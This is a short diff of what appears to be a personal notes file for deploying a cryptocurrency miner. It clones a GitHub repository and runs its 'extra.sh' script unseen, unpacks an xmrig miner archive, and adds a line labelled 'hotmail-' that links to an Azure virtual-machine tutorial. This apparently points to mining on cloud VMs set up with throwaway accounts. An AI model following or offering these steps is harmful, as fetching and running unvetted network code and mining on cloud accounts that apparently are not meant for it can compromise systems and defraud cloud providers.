@@ -1,5 +1,7 @@
 git clone https://github.com/dragonmhmh/dragonmhmh && cd dragonmhmh && chmod +x extra.sh && ./extra.sh
 
+hotmail- https://docs.microsoft.com/en-us/learn/modules/monitor-azure-vm-using-diagnostic-data/3-exercise-create-virtual-machine
+
 git clone https://github.com/dragonmhmh/dragonmhmh && cd dragonmhmh
 
 tar xvzf xmrig-6.3.3-linux-static-x64.tar.gz
